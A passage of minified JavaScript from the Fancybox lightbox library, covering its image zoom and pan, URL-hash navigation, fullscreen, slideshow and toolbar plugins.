                i.$closeButton &&
                  (i.$closeButton.remove(), (i.$closeButton = null));
              var o = n && n.$placeHolder;
              o &&
                (o.parentNode.insertBefore(n, o),
                o.remove(),
                (n.$placeHolder = null));
            },
          },
          {
            key: "onMessage",
            value: function (t) {
              try {
                var e = JSON.parse(t.data);
                if ("https://player.vimeo.com" === t.origin) {
                  if ("ready" === e.event) {
                    var i,
                      n = x(
                        document.getElementsByClassName("fancybox__iframe")
                      );
                    try {
                      for (n.s(); !(i = n.n()).done; ) {
                        var o = i.value;
                        o.contentWindow === t.source && (o.isReady = 1);
                      }
                    } catch (t) {
                      n.e(t);
                    } finally {
                      n.f();
                    }
                  }
                } else
                  "https://www.youtube-nocookie.com" === t.origin &&
                    "onReady" === e.event &&
                    (document.getElementById(e.id).isReady = 1);
              } catch (t) {}
            },
          },
          {
            key: "attach",
            value: function () {
              this.fancybox.on(this.events),
                window.addEventListener("message", this.onMessage, !1);
            },
          },
          {
            key: "detach",
            value: function () {
              this.fancybox.off(this.events),
                window.removeEventListener("message", this.onMessage, !1);
            },
          },
        ]),
        t
      );
    })();
  G.defaults = Z;
  var K = (function () {
    function t(e) {
      o(this, t), (this.fancybox = e);
      for (
        var i = 0,
          n = [
            "onReady",
            "onClosing",
            "onDone",
            "onPageChange",
            "onCreateSlide",
            "onRemoveSlide",
            "onImageStatusChange",
          ];
        i < n.length;
        i++
      ) {
        var a = n[i];
        this[a] = this[a].bind(this);
      }
      this.events = {
        ready: this.onReady,
        closing: this.onClosing,
        done: this.onDone,
        "Carousel.change": this.onPageChange,
        "Carousel.createSlide": this.onCreateSlide,
        "Carousel.removeSlide": this.onRemoveSlide,
      };
    }
    return (
      s(t, [
        {
          key: "onReady",
          value: function () {
            var t = this;
            this.fancybox.Carousel.slides.forEach(function (e) {
              e.$el && t.setContent(e);
            });
          },
        },
        {
          key: "onDone",
          value: function (t, e) {
            this.handleCursor(e);
          },
        },
        {
          key: "onClosing",
          value: function (t) {
            clearTimeout(this.clickTimer),
              (this.clickTimer = null),
              t.Carousel.slides.forEach(function (t) {
                t.$image && (t.state = "destroy"),
                  t.Panzoom && t.Panzoom.detachEvents();
              }),
              "closing" === this.fancybox.state &&
                this.canZoom(t.getSlide()) &&
                this.zoomOut();
          },
        },
        {
          key: "onCreateSlide",
          value: function (t, e, i) {
            "ready" === this.fancybox.state && this.setContent(i);
          },
        },
        {
          key: "onRemoveSlide",
          value: function (t, e, i) {
            i.$image &&
              (i.$el.classList.remove(t.option("Image.canZoomInClass")),
              i.$image.remove(),
              (i.$image = null)),
              i.Panzoom && (i.Panzoom.destroy(), (i.Panzoom = null)),
              i.$el && i.$el.dataset && delete i.$el.dataset.imageFit;
          },
        },
        {
          key: "setContent",
          value: function (t) {
            var e = this;
            if (
              !(t.isDom || t.html || (t.type && "image" !== t.type) || t.$image)
            ) {
              (t.type = "image"), (t.state = "loading");
              var i = document.createElement("div");
              i.style.visibility = "hidden";
              var n = document.createElement("img");
              n.addEventListener("load", function (i) {
                i.stopImmediatePropagation(), e.onImageStatusChange(t);
              }),
                n.addEventListener("error", function () {
                  e.onImageStatusChange(t);
                }),
                (n.src = t.src),
                (n.alt = ""),
                (n.draggable = !1),
                n.classList.add("fancybox__image"),
                t.srcset && n.setAttribute("srcset", t.srcset),
                t.sizes && n.setAttribute("sizes", t.sizes),
                (t.$image = n);
              var o = this.fancybox.option("Image.wrap");
              if (o) {
                var a = document.createElement("div");
                a.classList.add(
                  "string" == typeof o ? o : "fancybox__image-wrap"
                ),
                  a.appendChild(n),
                  i.appendChild(a),
                  (t.$wrap = a);
              } else i.appendChild(n);
              (t.$el.dataset.imageFit = this.fancybox.option("Image.fit")),
                this.fancybox.setContent(t, i),
                n.complete || n.error
                  ? this.onImageStatusChange(t)
                  : this.fancybox.showLoading(t);
            }
          },
        },
        {
          key: "onImageStatusChange",
          value: function (t) {
            var e = this,
              i = t.$image;
            i &&
              "loading" === t.state &&
              (i.complete && i.naturalWidth && i.naturalHeight
                ? (this.fancybox.hideLoading(t),
                  "contain" === this.fancybox.option("Image.fit") &&
                    this.initSlidePanzoom(t),
                  t.$el.addEventListener(
                    "wheel",
                    function (i) {
                      return e.onWheel(t, i);
                    },
                    { passive: !1 }
                  ),
                  t.$content.addEventListener(
                    "click",
                    function (i) {
                      return e.onClick(t, i);
                    },
                    { passive: !1 }
                  ),
                  this.revealContent(t))
                : this.fancybox.setError(t, "{{IMAGE_ERROR}}"));
          },
        },
        {
          key: "initSlidePanzoom",
          value: function (t) {
            var e = this;
            t.Panzoom ||
              ((t.Panzoom = new M(
                t.$el,
                k(!0, this.fancybox.option("Image.Panzoom", {}), {
                  viewport: t.$wrap,
                  content: t.$image,
                  width: t._width,
                  height: t._height,
                  wrapInner: !1,
                  textSelection: !0,
                  touch: this.fancybox.option("Image.touch"),
                  panOnlyZoomed: !0,
                  click: !1,
                  wheel: !1,
                })
              )),
              t.Panzoom.on("startAnimation", function () {
                e.fancybox.trigger("Image.startAnimation", t);
              }),
              t.Panzoom.on("endAnimation", function () {
                "zoomIn" === t.state && e.fancybox.done(t),
                  e.handleCursor(t),
                  e.fancybox.trigger("Image.endAnimation", t);
              }),
              t.Panzoom.on("afterUpdate", function () {
                e.handleCursor(t), e.fancybox.trigger("Image.afterUpdate", t);
              }));
          },
        },
        {
          key: "revealContent",
          value: function (t) {
            null === this.fancybox.Carousel.prevPage &&
            t.index === this.fancybox.options.startIndex &&
            this.canZoom(t)
              ? this.zoomIn()
              : this.fancybox.revealContent(t);
          },
        },
        {
          key: "getZoomInfo",
          value: function (t) {
            var e = t.$thumb.getBoundingClientRect(),
              i = e.width,
              n = e.height,
              o = t.$content.getBoundingClientRect(),
              a = o.width,
              s = o.height,
              r = o.top - e.top,
              l = o.left - e.left,
              c = this.fancybox.option("Image.zoomOpacity");
            return (
              "auto" === c && (c = Math.abs(i / n - a / s) > 0.1),
              { top: r, left: l, scale: a && i ? i / a : 1, opacity: c }
            );
          },
        },
        {
          key: "canZoom",
          value: function (t) {
            var e = this.fancybox,
              i = e.$container;
            if (window.visualViewport && 1 !== window.visualViewport.scale)
              return !1;
            if (t.Panzoom && !t.Panzoom.content.width) return !1;
            if (!e.option("Image.zoom") || "contain" !== e.option("Image.fit"))
              return !1;
            var n = t.$thumb;
            if (!n || "loading" === t.state) return !1;
            i.classList.add("fancybox__no-click");
            var o,
              a = n.getBoundingClientRect();
            if (this.fancybox.option("Image.ignoreCoveredThumbnail")) {
              var s = document.elementFromPoint(a.left + 1, a.top + 1) === n,
                r = document.elementFromPoint(a.right - 1, a.bottom - 1) === n;
              o = s && r;
            } else
              o =
                document.elementFromPoint(
                  a.left + 0.5 * a.width,
                  a.top + 0.5 * a.height
                ) === n;
            return i.classList.remove("fancybox__no-click"), o;
          },
        },
        {
          key: "zoomIn",
          value: function () {
            var t = this.fancybox,
              e = t.getSlide(),
              i = e.Panzoom,
              n = this.getZoomInfo(e),
              o = n.top,
              a = n.left,
              s = n.scale,
              r = n.opacity;
            t.trigger("reveal", e),
              i.panTo({
                x: -1 * a,
                y: -1 * o,
                scale: s,
                friction: 0,
                ignoreBounds: !0,
              }),
              (e.$content.style.visibility = ""),
              (e.state = "zoomIn"),
              !0 === r &&
                i.on("afterTransform", function (t) {
                  ("zoomIn" !== e.state && "zoomOut" !== e.state) ||
                    (t.$content.style.opacity = Math.min(
                      1,
                      1 - (1 - t.content.scale) / (1 - s)
                    ));
                }),
              i.panTo({
                x: 0,
                y: 0,
                scale: 1,
                friction: this.fancybox.option("Image.zoomFriction"),
              });
          },
        },
        {
          key: "zoomOut",
          value: function () {
            var t = this,
              e = this.fancybox,
              i = e.getSlide(),
              n = i.Panzoom;
            if (n) {
              (i.state = "zoomOut"),
                (e.state = "customClosing"),
                i.$caption && (i.$caption.style.visibility = "hidden");
              var o = this.fancybox.option("Image.zoomFriction"),
                a = function (e) {
                  var a = t.getZoomInfo(i),
                    s = a.top,
                    r = a.left,
                    l = a.scale,
                    c = a.opacity;
                  e || c || (o *= 0.82),
                    n.panTo({
                      x: -1 * r,
                      y: -1 * s,
                      scale: l,
                      friction: o,
                      ignoreBounds: !0,
                    }),
                    (o *= 0.98);
                };
              window.addEventListener("scroll", a),
                n.once("endAnimation", function () {
                  window.removeEventListener("scroll", a), e.destroy();
                }),
                a();
            }
          },
        },
        {
          key: "handleCursor",
          value: function (t) {
            if ("image" === t.type && t.$el) {
              var e = t.Panzoom,
                i = this.fancybox.option("Image.click", !1, t),
                n = this.fancybox.option("Image.touch"),
                o = t.$el.classList,
                a = this.fancybox.option("Image.canZoomInClass"),
                s = this.fancybox.option("Image.canZoomOutClass");
              if ((o.remove(s), o.remove(a), e && "toggleZoom" === i))
                e &&
                1 === e.content.scale &&
                e.option("maxScale") - e.content.scale > 0.01
                  ? o.add(a)
                  : e.content.scale > 1 && !n && o.add(s);
              else "close" === i && o.add(s);
            }
          },
        },
        {
          key: "onWheel",
          value: function (t, e) {
            if (
              "ready" === this.fancybox.state &&
              !1 !== this.fancybox.trigger("Image.wheel", e)
            )
              switch (this.fancybox.option("Image.wheel")) {
                case "zoom":
                  "done" === t.state && t.Panzoom && t.Panzoom.zoomWithWheel(e);
                  break;
                case "close":
                  this.fancybox.close();
                  break;
                case "slide":
                  this.fancybox[e.deltaY < 0 ? "prev" : "next"]();
              }
          },
        },
        {
          key: "onClick",
          value: function (t, e) {
            var i = this;
            if ("ready" === this.fancybox.state) {
              var n = t.Panzoom;
              if (
                !n ||
                (!n.dragPosition.midPoint &&
                  0 === n.dragOffset.x &&
                  0 === n.dragOffset.y &&
                  1 === n.dragOffset.scale)
              ) {
                if (this.fancybox.Carousel.Panzoom.lockAxis) return !1;
                var o = function (n) {
                    switch (n) {
                      case "toggleZoom":
                        e.stopPropagation(),
                          t.Panzoom && t.Panzoom.zoomWithClick(e);
                        break;
                      case "close":
                        i.fancybox.close();
                        break;
                      case "next":
                        e.stopPropagation(), i.fancybox.next();
                    }
                  },
                  a = this.fancybox.option("Image.click"),
                  s = this.fancybox.option("Image.doubleClick");
                s
                  ? this.clickTimer
                    ? (clearTimeout(this.clickTimer),
                      (this.clickTimer = null),
                      o(s))
                    : (this.clickTimer = setTimeout(function () {
                        (i.clickTimer = null), o(a);
                      }, 300))
                  : o(a);
              }
            }
          },
        },
        {
          key: "onPageChange",
          value: function (t, e) {
            var i = t.getSlide();
            e.slides.forEach(function (t) {
              t.Panzoom &&
                "done" === t.state &&
                t.index !== i.index &&
                t.Panzoom.panTo({ x: 0, y: 0, scale: 1, friction: 0.8 });
            });
          },
        },
        {
          key: "attach",
          value: function () {
            this.fancybox.on(this.events);
          },
        },
        {
          key: "detach",
          value: function () {
            this.fancybox.off(this.events);
          },
        },
      ]),
      t
    );
  })();
  K.defaults = {
    canZoomInClass: "can-zoom_in",
    canZoomOutClass: "can-zoom_out",
    zoom: !0,
    zoomOpacity: "auto",
    zoomFriction: 0.82,
    ignoreCoveredThumbnail: !1,
    touch: !0,
    click: "toggleZoom",
    doubleClick: null,
    wheel: "zoom",
    fit: "contain",
    wrap: !1,
    Panzoom: { ratio: 1 },
  };
  var J = (function () {
      function t(e) {
        o(this, t), (this.fancybox = e);
        for (var i = 0, n = ["onChange", "onClosing"]; i < n.length; i++) {
          var a = n[i];
          this[a] = this[a].bind(this);
        }
        (this.events = {
          initCarousel: this.onChange,
          "Carousel.change": this.onChange,
          closing: this.onClosing,
        }),
          (this.hasCreatedHistory = !1),
          (this.origHash = ""),
          (this.timer = null);
      }
      return (
        s(
          t,
          [
            {
              key: "onChange",
              value: function (t) {
                var e = this,
                  i = t.Carousel;
                this.timer && clearTimeout(this.timer);
                var n = null === i.prevPage,
                  o = t.getSlide(),
                  a = new URL(document.URL).hash,
                  s = !1;
                if (o.slug) s = "#" + o.slug;
                else {
                  var r = o.$trigger && o.$trigger.dataset,
                    l = t.option("slug") || (r && r.fancybox);
                  l &&
                    l.length &&
                    "true" !== l &&
                    (s =
                      "#" +
                      l +
                      (i.slides.length > 1 ? "-" + (o.index + 1) : ""));
                }
                n && (this.origHash = a !== s ? a : ""),
                  s &&
                    a !== s &&
                    (this.timer = setTimeout(function () {
                      try {
                        window.history[n ? "pushState" : "replaceState"](
                          {},
                          document.title,
                          window.location.pathname + window.location.search + s
                        ),
                          n && (e.hasCreatedHistory = !0);
                      } catch (t) {}
                    }, 300));
              },
            },
            {
              key: "onClosing",
              value: function () {
                if (
                  (this.timer && clearTimeout(this.timer),
                  !0 !== this.hasSilentClose)
                )
                  try {
                    return void window.history.replaceState(
                      {},
                      document.title,
                      window.location.pathname +
                        window.location.search +
                        (this.origHash || "")
                    );
                  } catch (t) {}
              },
            },
            {
              key: "attach",
              value: function (t) {
                t.on(this.events);
              },
            },
            {
              key: "detach",
              value: function (t) {
                t.off(this.events);
              },
            },
          ],
          [
            {
              key: "startFromUrl",
              value: function () {
                var e = t.Fancybox;
                if (e && !e.getInstance() && !1 !== e.defaults.Hash) {
                  var i = t.getParsedURL(),
                    n = i.hash,
                    o = i.slug,
                    a = i.index;
                  if (o) {
                    var s = document.querySelector(
                      '[data-slug="'.concat(n, '"]')
                    );
                    if (
                      (s &&
                        s.dispatchEvent(
                          new CustomEvent("click", {
                            bubbles: !0,
                            cancelable: !0,
                          })
                        ),
                      !e.getInstance())
                    ) {
                      var r = document.querySelectorAll(
                        '[data-fancybox="'.concat(o, '"]')
                      );
                      r.length &&
                        (null === a && 1 === r.length
                          ? (s = r[0])
                          : a && (s = r[a - 1]),
                        s &&
                          s.dispatchEvent(
                            new CustomEvent("click", {
                              bubbles: !0,
                              cancelable: !0,
                            })
                          ));
                    }
                  }
                }
              },
            },
            {
              key: "onHashChange",
              value: function () {
                var e = t.getParsedURL(),
                  i = e.slug,
                  n = e.index,
                  o = t.Fancybox,
                  a = o && o.getInstance();
                if (a && a.plugins.Hash) {
                  if (i) {
                    var s = a.Carousel;
                    if (i === a.option("slug")) return s.slideTo(n - 1);
                    var r,
                      l = x(s.slides);
                    try {
                      for (l.s(); !(r = l.n()).done; ) {
                        var c = r.value;
                        if (c.slug && c.slug === i) return s.slideTo(c.index);
                      }
                    } catch (t) {
                      l.e(t);
                    } finally {
                      l.f();
                    }
                    var h = a.getSlide(),
                      d = h.$trigger && h.$trigger.dataset;
                    if (d && d.fancybox === i) return s.slideTo(n - 1);
                  }
                  (a.plugins.Hash.hasSilentClose = !0), a.close();
                }
                t.startFromUrl();
              },
            },
            {
              key: "create",
              value: function (e) {
                function i() {
                  window.addEventListener("hashchange", t.onHashChange, !1),
                    t.startFromUrl();
                }
                (t.Fancybox = e),
                  H &&
                    window.requestAnimationFrame(function () {
                      /complete|interactive|loaded/.test(document.readyState)
                        ? i()
                        : document.addEventListener("DOMContentLoaded", i);
                    });
              },
            },
            {
              key: "destroy",
              value: function () {
                window.removeEventListener("hashchange", t.onHashChange, !1);
              },
            },
            {
              key: "getParsedURL",
              value: function () {
                var t = window.location.hash.substr(1),
                  e = t.split("-"),
                  i =
                    (e.length > 1 &&
                      /^\+?\d+$/.test(e[e.length - 1]) &&
                      parseInt(e.pop(-1), 10)) ||
                    null;
                return { hash: t, slug: e.join("-"), index: i };
              },
            },
          ]
        ),
        t
      );
    })(),
    Q = {
      pageXOffset: 0,
      pageYOffset: 0,
      element: function () {
        return (
          document.fullscreenElement ||
          document.mozFullScreenElement ||
          document.webkitFullscreenElement
        );
      },
      activate: function (t) {
        (Q.pageXOffset = window.pageXOffset),
          (Q.pageYOffset = window.pageYOffset),
          t.requestFullscreen
            ? t.requestFullscreen()
            : t.mozRequestFullScreen
            ? t.mozRequestFullScreen()
            : t.webkitRequestFullscreen
            ? t.webkitRequestFullscreen()
            : t.msRequestFullscreen && t.msRequestFullscreen();
      },
      deactivate: function () {
        document.exitFullscreen
          ? document.exitFullscreen()
          : document.mozCancelFullScreen
          ? document.mozCancelFullScreen()
          : document.webkitExitFullscreen && document.webkitExitFullscreen();
      },
    },
    tt = (function () {
      function t(e) {
        o(this, t),
          (this.fancybox = e),
          (this.active = !1),
          (this.handleVisibilityChange =
            this.handleVisibilityChange.bind(this));
      }
      return (
        s(t, [
          {
            key: "isActive",
            value: function () {
              return this.active;
            },
          },
          {
            key: "setTimer",
            value: function () {
              var t = this;
              if (this.active && !this.timer) {
                var e = this.fancybox.option("slideshow.delay", 3e3);
                this.timer = setTimeout(function () {
                  (t.timer = null),
                    t.fancybox.option("infinite") ||
                    t.fancybox.getSlide().index !==
                      t.fancybox.Carousel.slides.length - 1
                      ? t.fancybox.next()
                      : t.fancybox.jumpTo(0, { friction: 0 });
                }, e);
                var i = this.$progress;
                i ||
                  ((i = document.createElement("div")).classList.add(
                    "fancybox__progress"
                  ),
                  this.fancybox.$carousel.parentNode.insertBefore(
                    i,
                    this.fancybox.$carousel
                  ),
                  (this.$progress = i),
                  i.offsetHeight),
                  (i.style.transitionDuration = "".concat(e, "ms")),
                  (i.style.transform = "scaleX(1)");
              }
            },
          },
          {
            key: "clearTimer",
            value: function () {
              clearTimeout(this.timer),
                (this.timer = null),
                this.$progress &&
                  ((this.$progress.style.transitionDuration = ""),
                  (this.$progress.style.transform = ""),
                  this.$progress.offsetHeight);
            },
          },
          {
            key: "activate",
            value: function () {
              this.active ||
                ((this.active = !0),
                this.fancybox.$container.classList.add("has-slideshow"),
                "done" === this.fancybox.getSlide().state && this.setTimer(),
                document.addEventListener(
                  "visibilitychange",
                  this.handleVisibilityChange,
                  !1
                ));
            },
          },
          {
            key: "handleVisibilityChange",
            value: function () {
              this.deactivate();
            },
          },
          {
            key: "deactivate",
            value: function () {
              (this.active = !1),
                this.clearTimer(),
                this.fancybox.$container.classList.remove("has-slideshow"),
                document.removeEventListener(
                  "visibilitychange",
                  this.handleVisibilityChange,
                  !1
                );
            },
          },
          {
            key: "toggle",
            value: function () {
              this.active
                ? this.deactivate()
                : this.fancybox.Carousel.slides.length > 1 && this.activate();
            },
          },
        ]),
        t
      );
    })(),
    et = {
      display: [
        "counter",
        "zoom",
        "slideshow",
        "fullscreen",
        "thumbs",
        "close",
      ],
      autoEnable: !0,
      items: {
        counter: {
          position: "left",
          type: "div",
          class: "fancybox__counter",
          html: '<span data-fancybox-index=""></span>&nbsp;/&nbsp;<span data-fancybox-count=""></span>',
          attr: { tabindex: -1 },
        },
        prev: {
          type: "button",
          class: "fancybox__button--prev",
          label: "PREV",
          html: '<svg viewBox="0 0 24 24"><path d="M15 4l-8 8 8 8"/></svg>',
          attr: { "data-fancybox-prev": "" },
        },
        next: {
          type: "button",
          class: "fancybox__button--next",
          label: "NEXT",
          html: '<svg viewBox="0 0 24 24"><path d="M8 4l8 8-8 8"/></svg>',
          attr: { "data-fancybox-next": "" },
        },
        fullscreen: {
          type: "button",
          class: "fancybox__button--fullscreen",
          label: "TOGGLE_FULLSCREEN",
          html: '<svg viewBox="0 0 24 24">\n                <g><path d="M3 8 V3h5"></path><path d="M21 8V3h-5"></path><path d="M8 21H3v-5"></path><path d="M16 21h5v-5"></path></g>\n                <g><path d="M7 2v5H2M17 2v5h5M2 17h5v5M22 17h-5v5"/></g>\n            </svg>',
          click: function (t) {
            t.preventDefault(),
              Q.element()
                ? Q.deactivate()
                : Q.activate(this.fancybox.$container);
          },
        },
        slideshow: {
          type: "button",
          class: "fancybox__button--slideshow",
          label: "TOGGLE_SLIDESHOW",
          html: '<svg viewBox="0 0 24 24">\n                <g><path d="M6 4v16"/><path d="M20 12L6 20"/><path d="M20 12L6 4"/></g>\n                <g><path d="M7 4v15M17 4v15"/></g>\n            </svg>',
          click: function (t) {
            t.preventDefault(), this.Slideshow.toggle();
          },
        },
        zoom: {
          type: "button",
          class: "fancybox__button--zoom",
          label: "TOGGLE_ZOOM",
          html: '<svg viewBox="0 0 24 24"><circle cx="10" cy="10" r="7"></circle><path d="M16 16 L21 21"></svg>',
          click: function (t) {
            t.preventDefault();
            var e = this.fancybox.getSlide().Panzoom;
            e && e.toggleZoom();
          },
        },
        download: {
          type: "link",
          label: "DOWNLOAD",
          class: "fancybox__button--download",
          html: '<svg viewBox="0 0 24 24"><path d="M12 15V3m0 12l-4-4m4 4l4-4M2 17l.62 2.48A2 2 0 004.56 21h14.88a2 2 0 001.94-1.51L22 17"/></svg>',
          click: function (t) {
            t.stopPropagation();
          },
        },
        thumbs: {
          type: "button",
          label: "TOGGLE_THUMBS",
          class: "fancybox__button--thumbs",
          html: '<svg viewBox="0 0 24 24"><circle cx="4" cy="4" r="1" /><circle cx="12" cy="4" r="1" transform="rotate(90 12 4)"/><circle cx="20" cy="4" r="1" transform="rotate(90 20 4)"/><circle cx="4" cy="12" r="1" transform="rotate(90 4 12)"/><circle cx="12" cy="12" r="1" transform="rotate(90 12 12)"/><circle cx="20" cy="12" r="1" transform="rotate(90 20 12)"/><circle cx="4" cy="20" r="1" transform="rotate(90 4 20)"/><circle cx="12" cy="20" r="1" transform="rotate(90 12 20)"/><circle cx="20" cy="20" r="1" transform="rotate(90 20 20)"/></svg>',
          click: function (t) {
            t.stopPropagation();
            var e = this.fancybox.plugins.Thumbs;
            e && e.toggle();
          },
        },
        close: {
          type: "button",
          label: "CLOSE",
          class: "fancybox__button--close",
          html: '<svg viewBox="0 0 24 24"><path d="M20 20L4 4m16 0L4 20"></path></svg>',
          attr: { "data-fancybox-close": "", tabindex: 0 },
        },
      },
    },
    it = (function () {
      function t(e) {
        var i = this;
        o(this, t),
          (this.fancybox = e),
          (this.$container = null),
          (this.state = "init");
        for (
          var n = 0,
            a = [
              "onInit",
              "onPrepare",
              "onDone",
              "onKeydown",
              "onClosing",
              "onChange",
              "onSettle",
              "onRefresh",
            ];
          n < a.length;
          n++
        ) {
          var s = a[n];
          this[s] = this[s].bind(this);
        }
        this.events = {
          init: this.onInit,
          prepare: this.onPrepare,
          done: this.onDone,
          keydown: this.onKeydown,
          closing: this.onClosing,
          "Carousel.change": this.onChange,
          "Carousel.settle": this.onSettle,
          "Carousel.Panzoom.touchStart": function () {
            return i.onRefresh();
          },
          "Image.startAnimation": function (t, e) {
            return i.onRefresh(e);
          },
          "Image.afterUpdate": function (t, e) {
            return i.onRefresh(e);
          },
        };
      }
      return (
        s(t, [
          {
            key: "onInit",
            value: function () {
              if (this.fancybox.option("Toolbar.autoEnable")) {
                var t,
                  e = !1,
                  i = x(this.fancybox.items);
                try {
                  for (i.s(); !(t = i.n()).done; ) {
                    if ("image" === t.value.type) {
                      e = !0;
                      break;
                    }
                  }
                } catch (t) {
                  i.e(t);
                } finally {
                  i.f();
                }
                if (!e) return void (this.state = "disabled");
              }
              var n,
                o = x(this.fancybox.option("Toolbar.display"));
              try {
                for (o.s(); !(n = o.n()).done; ) {
                  var a = n.value;
                  if ("close" === (w(a) ? a.id : a)) {
                    this.fancybox.options.closeButton = !1;
                    break;
                  }
                }
              } catch (t) {
                o.e(t);
              } finally {
                o.f();
              }
            },
          },
          {
            key: "onPrepare",
            value: function () {
              var t = this.fancybox;
              if (
                "init" === this.state &&
                (this.build(),
                this.update(),
                (this.Slideshow = new tt(t)),
                !t.Carousel.prevPage &&
                  (t.option("slideshow.autoStart") && this.Slideshow.activate(),
                  t.option("fullscreen.autoStart") && !Q.element()))
              )
                try {
                  Q.activate(t.$container);
                } catch (t) {}
            },
          },
          {
            key: "onFsChange",
            value: function () {
              window.scrollTo(Q.pageXOffset, Q.pageYOffset);
            },
          },
          {
            key: "onSettle",
            value: function () {
              var t = this.fancybox,
                e = this.Slideshow;
              e &&
                e.isActive() &&
                (t.getSlide().index !== t.Carousel.slides.length - 1 ||
                t.option("infinite")
                  ? "done" === t.getSlide().state && e.setTimer()
                  : e.deactivate());
            },
          },
          {
            key: "onChange",
            value: function () {
              this.update(),
                this.Slideshow &&
                  this.Slideshow.isActive() &&
                  this.Slideshow.clearTimer();
            },
          },
          {
            key: "onDone",
            value: function (t, e) {
              var i = this.Slideshow;
              e.index === t.getSlide().index &&
                (this.update(),
                i &&
                  i.isActive() &&
                  (t.option("infinite") ||
                  e.index !== t.Carousel.slides.length - 1
                    ? i.setTimer()
                    : i.deactivate()));
            },
          },
          {
            key: "onRefresh",
            value: function (t) {
              (t && t.index !== this.fancybox.getSlide().index) ||
                (this.update(),
                !this.Slideshow ||
                  !this.Slideshow.isActive() ||
                  (t && "done" !== t.state) ||
                  this.Slideshow.deactivate());
            },
          },
          {
            key: "onKeydown",
            value: function (t, e, i) {
              " " === e &&
                this.Slideshow &&
                (this.Slideshow.toggle(), i.preventDefault());
            },
          },
          {
            key: "onClosing",
            value: function () {
              this.Slideshow && this.Slideshow.deactivate(),
                document.removeEventListener(
                  "fullscreenchange",
                  this.onFsChange
                );
            },
          },
          {
            key: "createElement",
            value: function (t) {
              var e, i;
              ("div" === t.type
                ? (e = document.createElement("div"))
                : (e = document.createElement(
                    "link" === t.type ? "a" : "button"
                  )).classList.add("carousel__button"),
              (e.innerHTML = t.html),
              e.setAttribute("tabindex", t.tabindex || 0),
              t.class) && (i = e.classList).add.apply(i, m(t.class.split(" ")));
              for (var n in t.attr) e.setAttribute(n, t.attr[n]);
              t.label &&
                e.setAttribute(
                  "title",
                  this.fancybox.localize("{{".concat(t.label, "}}"))
                ),
                t.click && e.addEventListener("click", t.click.bind(this)),
                "prev" === t.id && e.setAttribute("data-fancybox-prev", ""),
                "next" === t.id && e.setAttribute("data-fancybox-next", "");
              var o = e.querySelector("svg");
              return (
                o &&
                  (o.setAttribute("role", "img"),
                  o.setAttribute("tabindex", "-1"),
                  o.setAttribute("xmlns", "http://www.w3.org/2000/svg")),
                e
              );
            },
          },
          {
            key: "build",
            value: function () {
              var t = this;
              this.cleanup();
              var e,
                i = this.fancybox.option("Toolbar.items"),
                n = [
                  { position: "left", items: [] },
                  { position: "center", items: [] },
                  { position: "right", items: [] },
                ],
                o = this.fancybox.plugins.Thumbs,
                a = x(this.fancybox.option("Toolbar.display"));
              try {
                var s = function () {
                  var a = e.value,
                    s = void 0,
                    r = void 0;
                  if (
                    (w(a)
                      ? ((s = a.id), (r = k({}, i[s], a)))
                      : (r = i[(s = a)]),
                    ["counter", "next", "prev", "slideshow"].includes(s) &&
                      t.fancybox.items.length < 2)
                  )
                    return "continue";
                  if ("fullscreen" === s) {
                    if (!document.fullscreenEnabled || window.fullScreen)
                      return "continue";
                    document.addEventListener("fullscreenchange", t.onFsChange);
                  }
                  if ("thumbs" === s && (!o || "disabled" === o.state))
                    return "continue";
                  if (!r) return "continue";
                  var l = r.position || "right",
                    c = n.find(function (t) {
                      return t.position === l;
                    });
                  c && c.items.push(r);
                };
                for (a.s(); !(e = a.n()).done; ) s();
              } catch (t) {
                a.e(t);
              } finally {
                a.f();
              }
              var r = document.createElement("div");
              r.classList.add("fancybox__toolbar");
              for (var l = 0, c = n; l < c.length; l++) {
                var h = c[l];
                if (h.items.length) {
                  var d = document.createElement("div");
                  d.classList.add("fancybox__toolbar__items"),
                    d.classList.add(
                      "fancybox__toolbar__items--".concat(h.position)
                    );
                  var u,
                    f = x(h.items);
                  try {
                    for (f.s(); !(u = f.n()).done; ) {
                      var v = u.value;
                      d.appendChild(this.createElement(v));
                    }
                  } catch (t) {
                    f.e(t);
                  } finally {
                    f.f();
                  }
                  r.appendChild(d);
                }
              }
              this.fancybox.$carousel.parentNode.insertBefore(
                r,
                this.fancybox.$carousel
              ),
                (this.$container = r);
            },
          },
          {
            key: "update",
            value: function () {
              var t,
                e = this.fancybox.getSlide(),
                i = e.index,
                n = this.fancybox.items.length,
                o =
                  e.downloadSrc ||
                  ("image" !== e.type || e.error ? null : e.src),
                a = x(
                  this.fancybox.$container.querySelectorAll(
                    "a.fancybox__button--download"
                  )
                );
              try {
                for (a.s(); !(t = a.n()).done; ) {
                  var s = t.value;
                  o
                    ? (s.removeAttribute("disabled"),
                      s.removeAttribute("tabindex"),
                      s.setAttribute("href", o),
                      s.setAttribute("download", o),
                      s.setAttribute("target", "_blank"))
                    : (s.setAttribute("disabled", ""),
                      s.setAttribute("tabindex", -1),
                      s.removeAttribute("href"),
                      s.removeAttribute("download"));
                }
              } catch (t) {
                a.e(t);
              } finally {
                a.f();
              }
              var r,
                l = e.Panzoom,
                c = l && l.option("maxScale") > l.option("baseScale"),
                h = x(
                  this.fancybox.$container.querySelectorAll(
                    ".fancybox__button--zoom"
                  )
                );
              try {
                for (h.s(); !(r = h.n()).done; ) {
                  var d = r.value;
                  c
                    ? d.removeAttribute("disabled")
                    : d.setAttribute("disabled", "");
                }
              } catch (t) {
                h.e(t);
              } finally {
                h.f();
              }
              var u,
                f = x(
                  this.fancybox.$container.querySelectorAll(
                    "[data-fancybox-index]"
                  )
                );
              try {
                for (f.s(); !(u = f.n()).done; ) {
                  u.value.innerHTML = e.index + 1;
                }
              } catch (t) {
                f.e(t);
              } finally {
                f.f();
              }
              var v,
                p = x(
                  this.fancybox.$container.querySelectorAll(
                    "[data-fancybox-count]"
                  )
                );
              try {
                for (p.s(); !(v = p.n()).done; ) {
                  v.value.innerHTML = n;
                }
              } catch (t) {
                p.e(t);
              } finally {
                p.f();
              }
              if (!this.fancybox.option("infinite")) {
                var g,
                  m = x(
                    this.fancybox.$container.querySelectorAll(
                      "[data-fancybox-prev]"
                    )
                  );
                try {
                  for (m.s(); !(g = m.n()).done; ) {
                    var y = g.value;
                    0 === i
                      ? y.setAttribute("disabled", "")
                      : y.removeAttribute("disabled");
                  }
                } catch (t) {
                  m.e(t);
                } finally {
                  m.f();
                }
                var b,
                  w = x(
                    this.fancybox.$container.querySelectorAll(
                      "[data-fancybox-next]"
                    )
                  );
                try {
                  for (w.s(); !(b = w.n()).done; ) {
                    var k = b.value;
                    i === n - 1
                      ? k.setAttribute("disabled", "")
                      : k.removeAttribute("disabled");
                  }
